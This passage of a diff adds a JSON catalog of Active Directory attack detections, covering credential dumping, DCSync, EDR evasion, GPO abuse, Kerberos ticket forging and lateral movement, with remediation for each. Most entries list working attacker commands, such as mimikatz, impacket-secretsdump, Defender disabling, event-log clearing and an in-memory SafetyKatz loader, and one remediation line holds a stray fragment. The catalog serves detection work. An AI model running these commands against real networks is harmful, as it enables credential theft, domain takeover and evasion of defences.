+      "Monitor access to SECURITY registry hive"
+    ]
+  },
+  {
+    "category": "CREDENTIAL DUMP",
+    "id": "credump-laps-001",
+    "title": "LAPS Password \u2014 ms-Mcs-AdmPwd Attribute Read",
+    "severity": "HIGH",
+    "mitre": "T1552.006",
+    "description": "Detects unauthorized reading of LAPS (Local Administrator Password Solution) attribute ms-Mcs-AdmPwd from Active Directory. Reading this attribute provides local admin credentials for managed computers.",
+    "commands": [
+      "nxc ldap {dc} -u {user} -p {pass} -d {dom} -M laps",
+      "nxc smb {dc} -u {user} -p {pass} -d {dom} -M laps",
+      "ldapsearch -b '{base_dn}' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd cn"
+    ],
+    "all_commands": [
+      "nxc ldap {dc} -u {user} -p {pass} -d {dom} -M laps",
+      "nxc smb {dc} -u {user} -p {pass} -d {dom} -M laps",
+      "ldapsearch -b '{base_dn}' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd cn"
+    ],
+    "remediation": [
+      "Enable LAPS audit logging",
+      "Restrict ms-Mcs-AdmPwd read permissions to authorized accounts only",
+      "Migrate to Windows LAPS (newer, more secure)"
+    ]
+  },
+  {
+    "category": "CREDENTIAL DUMP",
+    "id": "credump-ekeys-001",
+    "title": "AES Encryption Key Extraction \u2014 sekurlsa::ekeys",
+    "severity": "CRITICAL",
+    "mitre": "T1003.001",
+    "description": "Extraction of AES128/AES256 Kerberos encryption keys from LSASS. Keys enable Overpass-the-Hash (Pass-the-Key), Silver Ticket, and S4U2Self attacks without needing plaintext passwords.",
+    "commands": [
+      "mimikatz sekurlsa::ekeys"
+    ],
+    "all_commands": [
+      "mimikatz sekurlsa::ekeys",
+      "Invoke-Mimi -Command '\\\"sekurlsa::ekeys\\\"'",
+      "C:\\\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit"
+    ],
+    "remediation": [
+      "Enable Credential Guard (makes AES keys unavailable in user-mode LSASS)",
+      "Enable LSASS PPL protection (RunAsPPL)",
+      "Audit Loader.exe / SafetyKatz patterns"
+    ]
+  },
+  {
+    "category": "CREDENTIAL DUMP",
+    "id": "credump-vault-001",
+    "title": "Windows Credential Vault Dump \u2014 vault::cred /patch",
+    "severity": "HIGH",
+    "mitre": "T1555.004",
+    "description": "Dumps credentials stored in Windows Credential Manager via Mimikatz token::elevate + vault::cred /patch. Can extract credentials stored by scheduled tasks, services, and users via cmdkey.",
+    "commands": [
+      "mimikatz token::elevate vault::cred /patch"
+    ],
+    "all_commands": [
+      "mimikatz token::elevate vault::cred /patch",
+      "Invoke-Mimi -Command '\\\"token::elevate\\\" \\\"vault::cred /patch\\\"'",
+      "$vault = New-Object Windows.Security.Credentials.PasswordVault; $vault.RetrieveAll()"
+    ],
+    "remediation": [
+      "Audit stored credentials (cmdkey /list)",
+      "Credential Guard protects domain credentials in vault",
+      "Restrict scheduled task credential storage"
+    ]
+  },
+  {
+    "category": "DCSYNC DCSHADOW",
+    "id": "dcsync-all-hashes-001",
+    "title": "DCSync \u2014 Full Domain Hash Dump via Replication Protocol",
+    "severity": "CRITICAL",
+    "mitre": "T1003.003",
+    "description": "DCSync uses MS-DRSR (Directory Replication Service Remote Protocol) to request password data as if replicating from a DC. Requires DS-Replication-Get-Changes-All privilege. Extracts NTLM hashes for all domain accounts including krbtgt.",
+    "commands": [
+      "impacket-secretsdump {dom}/{user}:{pass}@{dc} -just-dc-ntlm -outputfile /tmp/dcsync_all",
+      "mimikatz lsadump::dcsync /all /csv",
+      "Invoke-Mimi -Command '\\\"lsadump::dcsync /user:{dom}\\\\krbtgt\\\"'"
+    ],
+    "all_commands": [
+      "impacket-secretsdump {dom}/{user}:{pass}@{dc} -just-dc-ntlm -outputfile /tmp/dcsync_all",
+      "mimikatz lsadump::dcsync /all /csv",
+      "Invoke-Mimi -Command '\\\"lsadump::dcsync /user:{dom}\\\\krbtgt\\\"'"
+    ],
+    "remediation": [
+      "Audit DS-Replication-Get-Changes ACE on domain object",
+      "Deploy Microsoft Defender for Identity DCSync alert",
+      "Monitor Event 4662 with replication GUIDs from non-DCs (immediate alert)"
+    ]
+  },
+  {
+    "category": "DCSYNC DCSHADOW",
+    "id": "dcsync-targeted-001",
+    "title": "DCSync \u2014 Targeted Account Replication (krbtgt / Administrator)",
+    "severity": "CRITICAL",
+    "mitre": "T1003.003",
+    "description": "Targeted DCSync requesting specific accounts (krbtgt, Administrator). More stealthy than full dump \u2014 fewer 4662 events generated.",
+    "commands": [
+      "impacket-secretsdump {dom}/{user}:{pass}@{dc} -just-dc-user {target}",
+      "mimikatz lsadump::dcsync /user:{dom}\\\\krbtgt"
+    ],
+    "all_commands": [
+      "impacket-secretsdump {dom}/{user}:{pass}@{dc} -just-dc-user {target}",
+      "mimikatz lsadump::dcsync /user:{dom}\\\\krbtgt"
+    ],
+    "remediation": [
+      "Same as DCSync-all-001",
+      "Alert specifically when krbtgt or DA accounts are targeted via replication"
+    ]
+  },
+  {
+    "category": "DCSYNC DCSHADOW",
+    "id": "dcsync-dcshadow-001",
+    "title": "DCShadow \u2014 Rogue Domain Controller Registration for Stealth AD Modification",
+    "severity": "CRITICAL",
+    "mitre": "T1207",
+    "description": "DCShadow temporarily registers attacker machine as a Domain Controller using Mimikatz. Allows pushing arbitrary AD changes (group membership, SID history, password hash) that appear as legitimate DC replication \u2014 bypasses most SIEM auditing. Requires two simultaneous Mimikatz instances (SYSTEM + DA)",
+    "commands": [],
+    "all_commands": [],
+    "remediation": [
+      "Monitor CN=Configuration for new nTDSDSA objects (rogue DC registration)",
+      "Alert on DCShadow via Microsoft Defender for Identity",
+      "Monitor for unexpected replication sources in Event 4929"
+    ]
+  },
+  {
+    "category": "DCSYNC DCSHADOW",
+    "id": "dcsync-rights-check-001",
+    "title": "DCSync Rights Enumeration \u2014 dacledit Read on Domain Object",
+    "severity": "MEDIUM",
+    "mitre": "T1087.002",
+    "description": "Attacker enumerates which accounts have DS-Replication rights on domain object to identify existing DCSync-capable accounts or verify own rights.",
+    "commands": [
+      "impacket-dacledit -action read -target-dn '{base_dn}' {dom}/{user}:{pass} -dc-ip {dc} | grep -iE 'replication|dcsync|DS-Replication'",
+      "Get-DomainObjectAcl -Identity '{base_dn}' -ResolveGUIDs | Where-Object { $_.ObjectAceType -match 'DS-Replication'}"
+    ],
+    "all_commands": [
+      "impacket-dacledit -action read -target-dn '{base_dn}' {dom}/{user}:{pass} -dc-ip {dc} | grep -iE 'replication|dcsync|DS-Replication'",
+      "Get-DomainObjectAcl -Identity '{base_dn}' -ResolveGUIDs | Where-Object { $_.ObjectAceType -match 'DS-Replication'}"
+    ],
+    "remediation": [
+      "Enumerate current replication rights regularly",
+      "Remove unauthorized DS-Replication ACEs immediately",
+      "sast_code_analysis:"
+    ]
+  },
+  {
+    "category": "EDR EVASION",
+    "id": "edr-defender-disable-001",
+    "title": "Windows Defender Disabled via Set-MpPreference",
+    "severity": "CRITICAL",
+    "mitre": "T1562.001",
+    "description": "Set-MpPreference used to disable Windows Defender real-time protection, IOAV protection, behavior monitoring, and cloud protection. Standard CRTP flow \u2014 first step before loading offensive tools.",
+    "commands": [
+      "Add-MpPreference -ExclusionPath {tools_path}"
+    ],
+    "all_commands": [
+      "Set-MpPreference -DisableRealtimeMonitoring $true",
+      "Set-MpPreference -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true",
+      "Add-MpPreference -ExclusionPath {tools_path}"
+    ],
+    "remediation": [
+      "Alert on Windows Defender Event 5001 (protection disabled) \u2014 critical",
+      "Monitor Set-MpPreference executions via PowerShell logging",
+      "Implement tamper protection (prevents modification via PS/API)"
+    ]
+  },
+  {
+    "category": "EDR EVASION",
+    "id": "edr-safetykatz-001",
+    "title": "SafetyKatz via Loader.exe \u2014 In-Memory Credential Dump (No Disk Write)",
+    "severity": "CRITICAL",
+    "mitre": "T1003.001",
+    "description": "SafetyKatz is modified Mimikatz that bypasses AV signatures. Loader.exe fetches it from HTTP (127.0.0.1:8080 via port forwarding) and loads directly into memory. No file written to disk \u2014 bypasses file-based AV.",
+    "commands": [],
+    "all_commands": [
+      "C:\\\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe \\\"sekurlsa::logonpasswords\\\" \\\"exit\\",
+      "C:\\\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe \\\"sekurlsa::ekeys\\\" \\\"exit\\"
+    ],
+    "remediation": [
+      "Monitor Loader.exe execution and HTTP connections from process",
+      "Alert on .exe downloads from localhost (127.0.0.1) \u2014 unusual pattern",
+      "Deploy behavioral EDR that detects in-memory .NET assembly loading"
+    ]
+  },
+  {
+    "category": "EDR EVASION",
+    "id": "edr-amsi-bypass-001",
+    "title": "AMSI Bypass \u2014 AmsiScanBuffer Patch in PowerShell Session",
+    "severity": "HIGH",
+    "mitre": "T1059.001",
+    "description": "AMSI (Antimalware Scan Interface) bypass patches AmsiScanBuffer function in amsi.dll to return AMSI_RESULT_CLEAN for all scans. Multiple variants: reflection, direct patching, COM object manipulation.",
+    "commands": [],
+    "all_commands": [],
+    "remediation": [
+      "Enable AMSI for all PowerShell versions (v5+)",
+      "Deploy EDR with AMSI integration",
+      "Enable Script Block Logging to detect AMSI bypass attempts"
+    ]
+  },
+  {
+    "category": "EDR EVASION",
+    "id": "edr-etw-patch-001",
+    "title": "ETW Patching \u2014 Event Tracing for Windows Telemetry Disabled",
+    "severity": "HIGH",
+    "mitre": "T1562.006",
+    "description": "ETW (Event Tracing for Windows) patching blinds EDR products that rely on ETW for telemetry. Patches EtwEventWrite in ntdll.dll to return immediately without writing events. Effective against CrowdStrike, Defender.",
+    "commands": [],
+    "all_commands": [
+      "[Reflection.Assembly]::LoadFile('C:\\\\Windows\\\\System32\\\\ntdll.dll')"
+    ],
+    "remediation": [
+      "Deploy EDR with kernel-mode telemetry (not reliant on ETW)",
+      "Monitor ntdll.dll in-process modifications",
+      "Use Kernel Patch Protection (KPP / PatchGuard) on DCs"
+    ]
+  },
+  {
+    "category": "EDR EVASION",
+    "id": "edr-ntdll-unhook-001",
+    "title": "NTDLL Unhooking \u2014 Bypass EDR Userland Hooks",
+    "severity": "HIGH",
+    "mitre": "T1055",
+    "description": "EDR products hook ntdll.dll syscall stubs to inspect API calls. NTDLL unhooking loads clean copy from disk and replaces hooked section. Hell's Gate uses direct syscalls to bypass hooks entirely.",
+    "commands": [],
+    "all_commands": [
+      "HellsGate.exe / SysWhispers / Freshcopy technique"
+    ],
+    "remediation": [
+      "Deploy kernel-mode EDR (EarlyBird injection detection)",
+      "Use ETW-based telemetry (harder to bypass than userland hooks)",
+      "Monitor for ntdll.dll loaded from non-standard paths"
+    ]
+  },
+  {
+    "category": "EDR EVASION",
+    "id": "edr-nanodump-001",
+    "title": "nanodump \u2014 Stealth LSASS Dump Bypassing Defender/CrowdStrike",
+    "severity": "CRITICAL",
+    "mitre": "T1003.001",
+    "description": "nanodump uses invalid file signatures and process ID spoofing to dump LSASS while bypassing EDR. Creates a minidump without the MDMP signature that can be post-processed offline.",
+    "commands": [
+      "nanodump.exe --pid {lsass_pid} --write C:\\\\lsass.dmp"
+    ],
+    "all_commands": [
+      "nanodump.exe --pid {lsass_pid} --write C:\\\\lsass.dmp",
+      "nanodump.exe --valid\"  # Valid minidump with fake signature"
+    ],
+    "remediation": [
+      "Enable RunAsPPL for LSASS",
+      "Deploy Credential Guard",
+      "Monitor LSASS access with non-standard GrantedAccess masks"
+    ]
+  },
+  {
+    "category": "EDR EVASION",
+    "id": "edr-clear-logs-001",
+    "title": "Windows Event Log Clearing \u2014 Anti-Forensics",
+    "severity": "CRITICAL",
+    "mitre": "T1562.002",
+    "description": "Clearing Windows event logs removes evidence of attacker activity. wevtutil.exe cl is the most common method. System event 1102 generated upon Security log clearing (requires auditing enabled).",
+    "commands": [
+      "Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }"
+    ],
+    "all_commands": [
+      "wevtutil.exe cl Security",
+      "wevtutil.exe cl System",
+      "Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }",
+      "Clear-WinEvent -LogName Security"
+    ],
+    "remediation": [
+      "Forward event logs to central SIEM immediately (before clearing)",
+      "Enable Event Log forwarding (WEF - Windows Event Forwarding)",
+      "Alert on Event 1102 immediately \u2014 critical indicator"
+    ]
+  },
+  {
+    "category": "EDR EVASION",
+    "id": "edr-runasppl-disable-001",
+    "title": "RunAsPPL Disabled \u2014 LSASS PPL Protection Removed",
+    "severity": "CRITICAL",
+    "mitre": "T1562.001",
+    "description": "RunAsPPL (Protected Process Light) prevents LSASS memory access. PPLKiller or registry modification disables this protection. After disable, full LSASS dump is possible.",
+    "commands": [],
+    "all_commands": [],
+    "remediation": [
+      "Enable PPL Tamper Protection (requires Secure Boot)",
+      "Monitor RunAsPPL registry value (Event 4657)",
+      "Alert on PPLKiller.exe execution"
+    ]
+  },
+  {
+    "category": "GPO ABUSE",
+    "id": "gpo-create-link-001",
+    "title": "Unauthorized GPO Creation and OU Linking",
+    "severity": "CRITICAL",
+    "mitre": "T1484.001",
+    "description": "Attacker with GPO creation rights creates malicious GPO and links it to target OU. All computers/users in that OU execute GPO settings at next Group Policy refresh (90 minutes or forced via gpupdate).",
+    "commands": [
+      "New-GPO -Name '{gpo_name}' | New-GPLink -Target '{target_ou}'",
+      "SharpGPOAbuse.exe --AddComputerTask --TaskName {name} --Author {user} --Command cmd.exe --Arguments '/c {cmd}' --GPOName '{gpo}'"
+    ],
+    "all_commands": [
+      "New-GPO -Name '{gpo_name}' | New-GPLink -Target '{target_ou}'",
+      "SharpGPOAbuse.exe --AddComputerTask --TaskName {name} --Author {user} --Command cmd.exe --Arguments '/c {cmd}' --GPOName '{gpo}'"
+    ],
+    "remediation": [
+      "Alert on Event 5137 for new GPO creation by non-admin accounts",
+      "Alert on Event 5136 for gPLink modifications on sensitive OUs",
+      "Restrict GPO creation rights in Group Policy Management"
+    ]
+  },
+  {
+    "category": "GPO ABUSE",
+    "id": "gpo-runkey-001",
+    "title": "GPO Registry RunKey \u2014 Code Execution on Startup via Group Policy",
+    "severity": "CRITICAL",
+    "mitre": "T1547.001",
+    "description": "Attacker abuses GPO to push registry RunKey to all computers in target OU. Executes payload on every system restart or group policy refresh. HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run via GPO is invisible to standard registry monitoring of directly-written keys.",
+    "commands": [
+      "Set-GPPrefRegistryValue -Name '{gpo_name}' -Context Computer -Action Create -Key 'HKLM\\\\...\\\\Run' -ValueName '{name}' -Value '{cmd}'"
+    ],
+    "all_commands": [
+      "Set-GPPrefRegistryValue -Name '{gpo_name}' -Context Computer -Action Create -Key 'HKLM\\\\...\\\\Run' -ValueName '{name}' -Value '{cmd}'"
+    ],
+    "remediation": [
+      "Monitor SYSVOL for new Registry.xml files in Policy folders",
+      "Alert on RunKey additions via Group Policy",
+      "Review GPO Registry Preference settings regularly"
+    ]
+  },
+  {
+    "category": "GPO ABUSE",
+    "id": "gpo-scheduled-task-001",
+    "title": "GPO Immediate Scheduled Task \u2014 SharpGPOAbuse",
+    "severity": "CRITICAL",
+    "mitre": "T1053.005",
+    "description": "SharpGPOAbuse creates an \"Immediate\" scheduled task via GPO that executes on next Group Policy refresh without waiting for reboot. Most immediate GPO code execution technique.",
+    "commands": [
+      "SharpGPOAbuse.exe --AddComputerTask --TaskName {name} --Author {user} --Command cmd.exe --Arguments '/c {cmd}' --GPOName '{gpo}' --Force"
+    ],
+    "all_commands": [
+      "SharpGPOAbuse.exe --AddComputerTask --TaskName {name} --Author {user} --Command cmd.exe --Arguments '/c {cmd}' --GPOName '{gpo}' --Force"
+    ],
+    "remediation": [
+      "Monitor SYSVOL ScheduledTasks directories for new XML files",
+      "Alert on Event 4698 with non-standard task authors",
+      "Require change control for GPO scheduled task modifications"
+    ]
+  },
+  {
+    "category": "GPO ABUSE",
+    "id": "gpo-restricted-groups-001",
+    "title": "GPO Restricted Groups \u2014 Unauthorized Local Admin Addition",
+    "severity": "CRITICAL",
+    "mitre": "T1098.001",
+    "description": "GPO Restricted Groups policy forces group membership on managed computers. Adding attacker account to Local Administrators via GPO grants local admin on all computers in linked OUs automatically.",
+    "commands": [
+      "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {user} --GPOName '{gpo}'"
+    ],
+    "all_commands": [
+      "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {user} --GPOName '{gpo}'"
+    ],
+    "remediation": [
+      "Monitor GptTmpl.inf files in SYSVOL for Group Membership section changes",
+      "Alert on Event 4732 (Administrators) group additions from Group Policy"
+    ]
+  },
+  {
+    "category": "GPO ABUSE",
+    "id": "gpo-gpp-passwords-001",
+    "title": "GPP CPassword \u2014 Encrypted Credentials in SYSVOL Group Policy Files",
+    "severity": "CRITICAL",
+    "mitre": "T1552.006",
+    "description": "Group Policy Preferences (GPP) stored credentials in SYSVOL encrypted with static AES256 key published by Microsoft (MS14-025). Credentials from Groups.xml, Scheduledtasks.xml, Services.xml, DataSources.xml, Drives.xml can be decrypted by any domain user.",
+    "commands": [
+      "crackmapexec smb {dc} -u {user} -p {pass} -d {dom} -M gpp_password",
+      "crackmapexec smb {dc} -u {user} -p {pass} -d {dom} -M gpp_autologin",
+      "findstr /s /i cpassword \\\\\\\\{dc}\\\\sysvol"
+    ],
+    "all_commands": [
+      "crackmapexec smb {dc} -u {user} -p {pass} -d {dom} -M gpp_password",
+      "crackmapexec smb {dc} -u {user} -p {pass} -d {dom} -M gpp_autologin",
+      "Get-GPPPassword",
+      "findstr /s /i cpassword \\\\\\\\{dc}\\\\sysvol"
+    ],
+    "remediation": [
+      "Apply MS14-025 patch (removes ability to create new GPP passwords)",
+      "Search and remove existing cpassword fields from SYSVOL",
+      "findstr /s /i cpassword \\\\\\\\{dom}\\\\sysvol\\\\{dom}\\\\policies\\\\ | select-string cpassword"
+    ]
+  },
+  {
+    "category": "GPO ABUSE",
+    "id": "gpo-delegation-enum-001",
+    "title": "GPO Delegation \u2014 Enumerate Write Permissions on Group Policy Objects",
+    "severity": "MEDIUM",
+    "mitre": "T1087.002",
+    "description": "Bloodhound and PowerView enumerate GPO write permissions to find accounts with GPO modification rights. Any account with write access to a GPO linked to privileged OUs can compromise all computers in that OU.",
+    "commands": [
+      "bloodhound-python -c GPOs"
+    ],
+    "all_commands": [
+      "Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs",
+      "bloodhound-python -c GPOs"
+    ],
+    "remediation": [
+      "Audit GPO write permissions via Group Policy Management Console",
+      "Remove non-standard accounts with GPO modification rights",
+      "Alert on bulk GPO ACL enumeration"
+    ]
+  },
+  {
+    "category": "KERBEROS ATTACKS",
+    "id": "kerberos-asrep-roast-001",
+    "title": "AS-REP Roasting \u2014 Kerberos Pre-Auth Disabled Request",
+    "severity": "HIGH",
+    "mitre": "T1558.004",
+    "description": "Detects AS-REP requests for accounts with Kerberos pre-authentication disabled. Attacker enumerates user list and collects crackable hashes offline via GetNPUsers (impacket) or Rubeus.",
+    "commands": [
+      "impacket-GetNPUsers {domain}/ -dc-ip {dc} -usersfile users.txt -format hashcat",
+      "Rubeus.exe asreproast /nowrap"
+    ],
+    "all_commands": [
+      "impacket-GetNPUsers {domain}/ -dc-ip {dc} -usersfile users.txt -format hashcat",
+      "Rubeus.exe asreproast /nowrap"
+    ],
+    "remediation": [
+      "Enable Kerberos pre-authentication for ALL accounts",
+      "Audit accounts with DONT_REQ_PREAUTH flag via PowerShell",
+      "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}"
+    ]
+  },
+  {
+    "category": "KERBEROS ATTACKS",
+    "id": "kerberos-kerberoast-001",
+    "title": "Kerberoasting \u2014 TGS Request for Service Accounts with SPN",
+    "severity": "HIGH",
+    "mitre": "T1558.003",
+    "description": "Detects bulk TGS requests for service accounts with SPNs. Attacker uses authenticated account to request service tickets and cracks them offline. High number of TGS requests from single host is anomalous.",
+    "commands": [
+      "impacket-GetUserSPNs {domain}/{user}:{pass} -request -outputfile hashes.txt",
+      "Rubeus.exe kerberoast /nowrap"
+    ],
+    "all_commands": [
+      "impacket-GetUserSPNs {domain}/{user}:{pass} -request -outputfile hashes.txt",
+      "Rubeus.exe kerberoast /nowrap",
+      "Invoke-Kerberoast -OutputFormat HashCat"
+    ],
+    "remediation": [
+      "Use gMSA (Group Managed Service Accounts) \u2014 auto-rotating 240-char passwords",
+      "Set service account passwords to 30+ random characters",
+      "Monitor for RC4 TGS requests (prefer AES256)"
+    ]
+  },
+  {
+    "category": "KERBEROS ATTACKS",
+    "id": "kerberos-ptt-001",
+    "title": "Pass-the-Ticket \u2014 Kerberos Ticket Injection via klist/Rubeus",
+    "severity": "CRITICAL",
+    "mitre": "T1550.003",
+    "description": "Detects Kerberos ticket injection into a logon session from outside the normal Kerberos authentication flow. Golden/Silver tickets and stolen .ccache files are injected to gain unauthorized access.",
+    "commands": [
+      "export KRB5CCNAME=/tmp/admin.ccache; impacket-psexec domain/admin@dc -k -no-pass",
+      "Rubeus.exe ptt /ticket:<base64>",
+      "mimikatz kerberos::ptt ticket.kirbi"
+    ],
+    "all_commands": [
+      "export KRB5CCNAME=/tmp/admin.ccache; impacket-psexec domain/admin@dc -k -no-pass",
+      "Rubeus.exe ptt /ticket:<base64>",
+      "mimikatz kerberos::ptt ticket.kirbi"
+    ],
+    "remediation": [
+      "Enable Protected Users security group for privileged accounts",
+      "Implement Credential Guard (blocks ticket extraction from LSASS)",
+      "Monitor for anomalous Kerberos ticket lifetimes"
+    ]
+  },
+  {
+    "category": "KERBEROS ATTACKS",
+    "id": "kerberos-golden-ticket-001",
+    "title": "Golden Ticket \u2014 Forged TGT Using krbtgt Hash",
+    "severity": "CRITICAL",
+    "mitre": "T1558.001",
+    "description": "Detects creation and use of Golden Tickets \u2014 forged TGTs signed with the krbtgt account NTLM hash. Golden tickets can impersonate any user, survive password resets, and grant arbitrary group memberships.",
+    "commands": [
+      "impacket-ticketer -nthash {krbtgt} -domain-sid {sid} -domain {dom} Administrator",
+      "Rubeus.exe golden /rc4:{krbtgt} /domain:{dom} /sid:{sid} /user:Administrator /ptt",
+      "mimikatz kerberos::golden /krbtgt:{hash} /domain:{dom} /sid:{sid} /user:Admin /ptt"
+    ],
+    "all_commands": [
+      "impacket-ticketer -nthash {krbtgt} -domain-sid {sid} -domain {dom} Administrator",
+      "Rubeus.exe golden /rc4:{krbtgt} /domain:{dom} /sid:{sid} /user:Administrator /ptt",
+      "mimikatz kerberos::golden /krbtgt:{hash} /domain:{dom} /sid:{sid} /user:Admin /ptt"
+    ],
+    "remediation": [
+      "Reset krbtgt password TWICE (invalidates all existing tickets)",
+      "Enable PAC validation (KB5008380)",
+      "Monitor for 4769 events without corresponding 4768"
+    ]
+  },
+  {
+    "category": "KERBEROS ATTACKS",
+    "id": "kerberos-silver-ticket-001",
+    "title": "Silver Ticket \u2014 Forged Service Ticket Using Service Account Hash",
+    "severity": "CRITICAL",
+    "mitre": "T1558.002",
+    "description": "Detects Silver Ticket attacks \u2014 forged TGS tickets signed with service account NTLM hash. Bypasses the KDC entirely. More stealthy than Golden Ticket as no DC authentication required.",
+    "commands": [
+      "impacket-ticketer -nthash {svc_hash} -domain-sid {sid} -domain {dom} -spn cifs/server silverticket",
+      "mimikatz kerberos::golden /user:Admin /service:cifs /rc4:{hash} /target:srv /ptt",
+      "Rubeus.exe silver /service:cifs/{target} /rc4:{hash} /sid:{sid} /user:Admin /ptt"
+    ],
+    "all_commands": [
+      "impacket-ticketer -nthash {svc_hash} -domain-sid {sid} -domain {dom} -spn cifs/server silverticket",
+      "mimikatz kerberos::golden /user:Admin /service:cifs /rc4:{hash} /target:srv /ptt",
+      "Rubeus.exe silver /service:cifs/{target} /rc4:{hash} /sid:{sid} /user:Admin /ptt"
+    ],
+    "remediation": [
+      "Rotate service account passwords regularly (use gMSA)",
+      "Enable PAC validation \u2014 KB5008380",
+      "Monitor for service authentications without DC-side Kerberos events"
+    ]
+  },
+  {
+    "category": "KERBEROS ATTACKS",
+    "id": "kerberos-diamond-ticket-001",
+    "title": "Diamond Ticket \u2014 Stealthy TGT Modification (Evades Golden Ticket Detection)",
+    "severity": "CRITICAL",
+    "mitre": "T1558.001",
+    "description": "Diamond Ticket modifies a legitimate TGT in-memory rather than forging from scratch. Harder to detect than Golden Ticket as real TGT was requested from KDC. Rubeus diamond command uses /tgtdeleg or krbtgt AES key.",
+    "commands": [
+      "Rubeus.exe diamond /tgtdeleg /enctype:aes /ticketuser:Administrator /domain:{dom} /dc:{dc} /ptt",
+      "Rubeus.exe diamond /krbkey:{aes256} /user:{user} /password:{pw} /enctype:aes /ticketuser:Admin /ptt"
+    ],
+    "all_commands": [
+      "Rubeus.exe diamond /tgtdeleg /enctype:aes /ticketuser:Administrator /domain:{dom} /dc:{dc} /ptt",
+      "Rubeus.exe diamond /krbkey:{aes256} /user:{user} /password:{pw} /enctype:aes /ticketuser:Admin /ptt"
+    ],
+    "remediation": [
+      "Monitor Rubeus.exe execution (process creation events)",
+      "Implement PAC validation KB5008380 (checks SID consistency)",
+      "Alert on /tgtdeleg usage \u2014 Kerberos delegation from unexpected accounts"
+    ]
+  },
+  {
+    "category": "KERBEROS ATTACKS",
+    "id": "kerberos-unconstrained-delegation-001",
+    "title": "Unconstrained Delegation \u2014 TGT Capture via Coercion",
+    "severity": "CRITICAL",
+    "mitre": "T1134.001",
+    "description": "Computers with Unconstrained Delegation store TGTs for all authenticating users in LSASS. Attacker coerces DC authentication to this host, captures DC's TGT, and uses it to compromise the domain.",
+    "commands": [
+      "Rubeus.exe monitor /interval:5 /filteruser:DC$",
+      "impacket-findDelegation {dom}/{user}:{pass} -dc-ip {dc}"
+    ],
+    "all_commands": [
+      "Rubeus.exe monitor /interval:5 /filteruser:DC$",
+      "impacket-findDelegation {dom}/{user}:{pass} -dc-ip {dc}"
+    ],
+    "remediation": [
+      "Remove Unconstrained Delegation from non-DC computers",
+      "Enable \"Account is sensitive and cannot be delegated\" on privileged accounts",
+      "Use Constrained Delegation or Resource-Based Constrained Delegation instead"
+    ]
+  },
+  {
+    "category": "KERBEROS ATTACKS",
+    "id": "kerberos-constrained-delegation-001",
+    "title": "Constrained Delegation S4U2Proxy Abuse",
+    "severity": "HIGH",
+    "mitre": "T1134.001",
+    "description": "Abuses S4U2Self/S4U2Proxy extensions to impersonate any user to services the compromised account is allowed to delegate to. Requires control of an account with msDS-AllowedToDelegateTo attribute set.",
+    "commands": [
+      "impacket-getST -spn cifs/{target}.{dom} -impersonate Administrator {dom}/{user}:{pass}",
+      "Rubeus.exe s4u /user:{svc} /aes256:{key} /impersonateuser:Admin /msdsspn:cifs/{target} /ptt"
+    ],
+    "all_commands": [
+      "impacket-getST -spn cifs/{target}.{dom} -impersonate Administrator {dom}/{user}:{pass}",
+      "Rubeus.exe s4u /user:{svc} /aes256:{key} /impersonateuser:Admin /msdsspn:cifs/{target} /ptt"
+    ],
+    "remediation": [
+      "Audit msDS-AllowedToDelegateTo attributes",
+      "Enable \"Account is sensitive and cannot be delegated\" for privileged users",
+      "Prefer RBCD over Constrained Delegation where possible"
+    ]
+  },
+  {
+    "category": "LATERAL MOVEMENT",
+    "id": "lateral-psexec-001",
+    "title": "PSExec-Style Lateral Movement \u2014 Remote Service Creation via SMB",
+    "severity": "CRITICAL",
+    "mitre": "T1021.002",
+    "description": "Detects PSExec-style execution via SMB IPC$ share and Windows Service Manager. Creates a random-named service, executes payload, then removes. impacket-psexec, sysinternals psexec, and Cobalt Strike use this pattern.",
+    "commands": [
+      "impacket-psexec {dom}/{user}:{pass}@{dc}",
+      "impacket-psexec {dom}/{user}@{dc} -hashes :{ntlm_hash}"
+    ],
+    "all_commands": [
+      "impacket-psexec {dom}/{user}:{pass}@{dc}",
+      "impacket-psexec {dom}/{user}@{dc} -hashes :{ntlm_hash}"
+    ],
+    "remediation": [
+      "Restrict admin shares (ADMIN$, C$) access",
+      "Block lateral movement via host-based firewall rules",
+      "Monitor Event ID 7045 for short-lived random services"
+    ]
+  },
+  {
+    "category": "LATERAL MOVEMENT",
+    "id": "lateral-wmiexec-001",
+    "title": "WMI Remote Command Execution \u2014 Lateral Movement",
+    "severity": "HIGH",
+    "mitre": "T1047",
+    "description": "Detects WMI-based remote command execution (impacket-wmiexec, CrackMapExec WMI). WMI semi-interactive shell spawns cmd.exe via WmiPrvSE.exe. Harder to detect than PSExec \u2014 no service creation.",
+    "commands": [
+      "impacket-wmiexec {dom}/{user}:{pass}@{dc}",
+      "impacket-wmiexec {dom}/{user}@{dc} -hashes :{ntlm}",
+      "crackmapexec smb {dc} -u {user} -p {pass} -x 'whoami'"
+    ],
+    "all_commands": [
+      "impacket-wmiexec {dom}/{user}:{pass}@{dc}",
+      "impacket-wmiexec {dom}/{user}@{dc} -hashes :{ntlm}",
+      "crackmapexec smb {dc} -u {user} -p {pass} -x 'whoami'"
+    ],
+    "remediation": [
+      "Disable WMI remote access via Windows Firewall",
+      "Monitor WmiPrvSE.exe child processes",
+      "Restrict DCOM permissions (Component Services)"
+    ]
+  },
+  {
+    "category": "LATERAL MOVEMENT",
+    "id": "lateral-evil-winrm-001",
+    "title": "Evil-WinRM \u2014 Windows Remote Management Shell Access",
+    "severity": "HIGH",
+    "mitre": "T1021.006",
+    "description": "Detects Evil-WinRM connections for remote PowerShell shell access. Uses WinRM (TCP 5985/5986). Supports Pass-the-Hash and certificate auth.",
+    "commands": [
+      "evil-winrm -i {dc} -u {user} -p {pass}",
+      "evil-winrm -i {dc} -u {user} -H {ntlm_hash}"
+    ],
+    "all_commands": [
